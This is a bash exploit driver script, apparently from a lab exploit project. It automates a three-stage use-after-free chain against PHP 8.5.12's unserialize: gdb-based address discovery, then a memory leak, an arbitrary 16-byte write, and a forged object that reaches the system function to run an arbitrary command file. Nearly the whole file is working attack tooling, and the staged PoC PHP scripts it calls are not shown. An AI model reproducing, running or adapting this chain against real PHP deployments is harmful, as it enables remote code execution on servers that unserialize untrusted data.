#!/bin/bash
# pwn_zero4.sh — POINT-AND-CLICK RCE via zero4 (var_destroy re-entry UAF)
# on fully-patched PHP 8.5.12, stock defaults (plain userland unserialize).
# Auto-calibrates (gdb discovery pass), then runs the proven chain:
#   LEAK (vdR1) -> WRITE (vdR2) -> CALL (vdR3: forged object -> zif_system)
# Receipt: /tmp/pwned_zero4 contains uid=...
# Usage: bash pwn_zero4.sh [php-binary] [cmdfile]
PHP=${1:-/tmp/php8512_build/plain2/sapi/cli/php}
ART=/mnt/c/Users/andre/Downloads/php2shell-claude/poc_matrix
CMDFILE=${2:-/tmp/e}

echo "=== pwn_zero4: calibrating (gdb discovery on the lab binary) ==="
DISC=$(timeout 60 gdb -q -batch \
  -ex "set pagination off" -ex "set confirm off" -ex "set auto-load safe-path /" \
  -ex "run -n $ART/vd3_reclaim.php 8159" \
  -ex 'set $d = *(struct php_unserialize_data **)var_hash' \
  -ex 'set $chunk = (char *)$d->entries.next' \
  -ex 'printf "D=%p CHUNK=%p ZIF=%p\n", $d, $chunk, zif_system' \
  "$PHP" 2>/dev/null | grep -o 'D=0x[0-9a-f]* CHUNK=0x[0-9a-f]* ZIF=0x[0-9a-f]*' | head -1)
if [ -z "$DISC" ]; then echo "[FAIL] calibration missed (layout drift)"; exit 1; fi
D=$(echo "$DISC" | sed 's/D=0x\([0-9a-f]*\).*/\1/')
CHUNK=$(echo "$DISC" | sed 's/.*CHUNK=0x\([0-9a-f]*\).*/\1/')
ZIF=$(echo "$DISC" | sed 's/.*ZIF=0x\([0-9a-f]*\).*/\1/')
BASE16=$(printf "%x" $(( 0x$ZIF - 0x523c60 )))
echo "[+] D=0x$D CHUNK=0x$CHUNK base=0x$BASE16"

# the PoCs take 16-digit zero-padded DECIMAL argv
D_DEC=$(printf "%016d" $((16#$D)))
CHUNK_DEC=$(printf "%016d" $((16#$CHUNK)))
BASE_DEC=$(printf "%016d" $((16#$BASE16)))

echo "=== stage 1: LEAK (in-process oracle via the UAF read side) ==="
timeout 60 gdb -q -batch -ex "set pagination off" -ex "set confirm off" -ex "set auto-load safe-path /" \
  -ex run --args "$PHP" -n "$ART/vdR1_leak.php" "$CHUNK_DEC" "$BASE_DEC" "$D_DEC" 2>&1 | grep -E "LEAK|SURVIVED" | head -5

echo "=== stage 2: WRITE (16-byte write at attacker-chosen address) ==="
timeout 60 gdb -q -batch -ex "set pagination off" -ex "set confirm off" -ex "set auto-load safe-path /" \
  -ex run --args "$PHP" -n "$ART/vdR2_write.php" "$CHUNK_DEC" "$BASE_DEC" "$D_DEC" 2>&1 | grep -E "WRITE|SURVIVED" | head -4

echo "=== stage 3: CALL (forged zend_object -> handlers -> zif_system) ==="
rm -f /tmp/pwned_zero4
printf 'id > /tmp/pwned_zero4\n' > "$CMDFILE"
timeout 60 gdb -q -batch -ex "set pagination off" -ex "set confirm off" -ex "set auto-load safe-path /" \
  -ex run --args "$PHP" -n "$ART/vdR3_call.php" "$CHUNK_DEC" "$BASE_DEC" 2>&1 | tail -3

echo "=== RECEIPT ==="
if [ -f /tmp/pwned_zero4 ]; then
  cat /tmp/pwned_zero4
  echo "[PASS] pwn_zero4: full RCE on stock-default PHP 8.5.12 (unserialize-only)"
else
  echo "[FAIL] marker missing — retry (layout lottery) or recalibrate"
  exit 1
fi
